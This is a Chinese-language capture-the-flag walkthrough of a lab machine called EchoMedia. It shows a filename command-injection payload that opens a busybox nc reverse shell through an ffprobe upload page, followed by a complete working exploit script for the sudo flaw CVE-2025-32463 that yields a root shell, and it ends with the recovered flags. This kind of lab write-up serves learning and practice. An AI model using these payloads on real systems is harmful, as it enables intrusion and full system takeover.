

![image-20251119211245734](http://7r1UMPHK.github.io/image/20251120164719984.webp)

>**靶机地址**: https://labs.thehackerslabs.com/machine/133
>
>**难度**：~~困难~~（中等）
>
>**作者**：**rubert**

## 一、信息收集

### 1.1 主机发现

使用 `arp-scan` 对目标网段进行扫描，以发现存活主机。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
...
192.168.205.139 08:00:27:4a:e9:7d       PCS Systemtechnik GmbH
...
```

根据扫描结果，确定目标主机的 IP 地址为 `192.168.205.139`。

### 1.2 端口扫描

使用 Nmap 对目标主机进行全端口扫描，以确定开放的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.139
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-19 20:49 CST
Nmap scan report for 192.168.205.139
Host is up (0.00024s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
5555/tcp open  freeciv
MAC Address: 08:00:27:4A:E9:7D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

扫描发现目标开放了两个端口：

*   **80/tcp**: HTTP 服务 (Apache)
*   **5555/tcp**: freeciv (游戏服务，通常优先级较低)

## 二、服务枚举与漏洞发现

### 2.1 HTTP 服务枚举

访问 80 端口，页面显示标题为 "CTF: Media Upload System"。这是一个文件上传页面，用于上传多媒体文件并分析其时长。

```html
<!-- 页面源码片段 -->
<div class="mt-4">
    <h4>💡 Pista:</h4>
    <p>El sistema analiza archivos multimedia con ffprobe. ¿Puedes encontrar una forma de ejecutar comandos?</p>
</div>
```

页面底部给出了一条明确的西班牙语提示：

> "El sistema analiza archivos multimedia con ffprobe. ¿Puedes encontrar una forma de ejecutar comandos?"
>
> **译文**：系统使用 `ffprobe` 分析多媒体文件。你能找到执行命令的方法吗？

### 2.2 漏洞点分析

根据提示，后端逻辑很可能是调用系统命令 `ffprobe ??? <文件名>` 来处理上传的文件。如果文件名没有经过严格过滤，直接拼接到 shell 命令中，我们就可以通过构造特殊的文件名来执行任意命令。

尝试上传正常视频文件，提示 "Archivo multimedia de duración desconocida subido" (上传了未知时长的多媒体文件)，且 `/uploads` 目录禁止访问，无法利用上传的文件本身。因此重点在于**文件名命令注入**。

## 三、漏洞利用

### 3.1 命令注入获取 Shell

为了绕过可能存在的过滤或空格限制，并利用文件名闭合命令，我们可以构造如下 Payload 作为文件名。

**Payload 构造思路：**

1.  闭合前面的引号：`";`
2.  执行反弹 Shell 命令。这里使用了 `busybox nc`，并且将 IP 地址转换为十进制以绕过点号过滤。
    *   攻击机 IP: `192.168.205.128`
    *   十进制 IP: `3232288128`
3.  注释掉后面的命令：`#`

**最终文件名 Payload:**

```text
test.";busybox nc 3232288128 8888 -e sh #
```

### 3.2 实施攻击

1. **本地开启监听**：

   ```bash
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
   └─$ nc -lvnp 8888
   listening on [any] 8888 ...
   ```

2. **发送请求**：
   使用 Burp Suite 抓包修改文件名，或者直接在上传时将文件重命名为上述 Payload 并上传。

3. ![image-20251119210318010](http://7r1UMPHK.github.io/image/20251120164725018.webp)

4. **获取 Shell**：
   上传后，后端执行 `ffprobe ??? "test.";busybox nc ... #"`，成功反弹 Shell。

   ```bash
   connect to [192.168.205.128] from (UNKNOWN) [192.168.205.139] 56006
   id
   uid=33(www-data) gid=33(www-data) groups=33(www-data)
   ```

### 3.3 Shell 升级

获取的 Shell 为非交互式，为了方便后续操作，进行 Shell 升级。

```bash
script /dev/null -c bash
# 按下 Ctrl+Z 挂起
stty raw -echo; fg
# 回车后输入 reset
reset
xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 36 columns 178
```

## 四、权限提升

### 4.1 信息收集

查看 `/home` 目录，发现存在用户 `Dr_Simi` 。

```bash
www-data@TheHackersLabs-EchoMedia:/home$ ls -al
drwx------  3 Dr_Simi Dr_Simi    4096 Sep 16 20:46 Dr_Simi
-rw-rw-r--  1 root    root         95 Sep 16 20:29 .oculto.txt
...
```

虽然有隐藏文件，但直接查看 `sudo` 相关的漏洞可能更为快捷。

### 4.2 利用 CVE-2025-32463提权

经过测试，发现目标系统可能受到 `sudo` 相关漏洞的影响。该漏洞允许在特定配置下通过操纵环境来提升权限。

> [!TIP]
>
> https://github.com/pr0v3rbs/CVE-2025-32463_chwoot

**利用脚本 (`exploit.sh`)：**

在目标机器的 `/tmp` 目录下创建以下脚本：

```bash
#!/bin/bash
# CVE-2025-32463 – Sudo EoP Exploit PoC
# Original by Rich Mirch

STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd ${STAGE?} || exit 1

# 默认获取 root shell
CMD="/bin/bash"

# 转义命令字符
CMD_C_ESCAPED=$(printf '%s' "$CMD" | sed -e 's/\\/\\\\/g' -e 's/"/\\"/g')

# 创建恶意 C 代码
cat > woot1337.c<<EOF
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  execl("/bin/sh", "sh", "-c", "${CMD_C_ESCAPED}", NULL);
}
EOF

# 构建恶意环境结构
mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc

# 编译共享库
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

echo "woot!"
# 触发漏洞
sudo -R woot woot
rm -rf ${STAGE?}
```

### 4.3 获取 Root 权限

1. **赋予执行权限并运行**：

   ```bash
   www-data@TheHackersLabs-EchoMedia:/tmp$ chmod +x exploit.sh 
   www-data@TheHackersLabs-EchoMedia:/tmp$ bash exploit.sh 
   woot!
   ```

2. **验证权限**：
   脚本执行完毕后，成功获得 Root Shell。

   ```bash
   root@TheHackersLabs-EchoMedia:/# id
   uid=0(root) gid=0(root) groups=0(root),33(www-data)
   ```

3. **读取 Flag**：
   分别读取 User Flag 和 Root Flag。

   ```bash
   root@TheHackersLabs-EchoMedia:/# cat /home/Dr_Simi/user.txt
   YjQwcWliRTZFMmVPUkV1c08zM3FHUzVv
   
   root@TheHackersLabs-EchoMedia:/# cat /root/root.txt
   SjI5cXhQVHowNkdia1Z2MnNQWlQyR1N5
   ```

至此，成功完成对 `TheHackersLabs-EchoMedia` 靶机的渗透。